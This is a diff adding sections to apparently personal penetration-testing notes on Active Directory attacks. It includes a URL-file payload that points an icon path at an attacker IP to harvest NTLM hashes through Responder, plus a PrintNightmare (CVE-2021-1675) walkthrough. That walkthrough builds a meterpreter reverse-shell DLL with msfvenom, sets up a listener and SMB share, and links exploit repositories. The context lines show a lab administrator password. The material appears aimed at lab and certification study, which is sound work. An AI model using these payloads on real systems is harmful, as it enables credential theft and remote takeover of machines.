@@ -480,3 +480,98 @@ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
 C:\Windows\system32>whoami
 nt authority\system
 ```
+
+## URL File Attacks -- Originally known as SCF Attack
+
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share" %}
+
+Imagine the following scenario:
+
+* You have compromised a user
+* This user has share access
+* This means that you have access to capture additional hashes via <mark style="color:yellow;">Responder</mark>
+* Or an open file share will work as well
+
+### Payload
+
+```
+html
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\x.x.x.x\%USERNAME%.icon
+IconIndex=1
+```
+
+* Change the IP in IconFile to your attacker IP
+* When you go to save the file, make sure you are saving it as something like "@test.url"
+* The @ will force the file at the top of the share
+
+### Responder
+
+```
+sudo responder -I tun0 -v
+```
+
+* Upon navigating to the file, dumping the file into a file share, it will dump hashes like crazy!!
+
+## PrintNightmare (CVE-2021-1675)
+
+### Detecting Vulnerability
+
+<mark style="color:yellow;">rpcdump.py</mark>
+
+```
+impacket-rpcdump @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
+
+
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+Protocol: [MS-RPRN]: Print System Remote Protocol
+```
+
+* If you see the following output, you are indeed <mark style="color:yellow;">VULNERABLE</mark>
+* Utilize the RCE exploit found below!
+
+### Exploitation
+
+* We need to create and host a malicious DLL
+
+Create malicious DLL:
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.138.128 LPORT=5555 -f dll > shell.dll
+```
+
+Start Metasploit:
+
+```
+msfconsole
+
+use multi/handler
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set lport 5555
+
+set lhost tun0
+
+run
+
+listening
+```
+
+Share File (SMB Server):
+
+```
+impacket-smbserver smb .
+```
+
+### Repos
+
+RCE:
+
+{% embed url="https://github.com/cube0x0/CVE-2021-1675" %}
+
+Local Privilege Escalation:
+
+{% embed url="https://github.com/calebstewart/CVE-2021-1675" %}
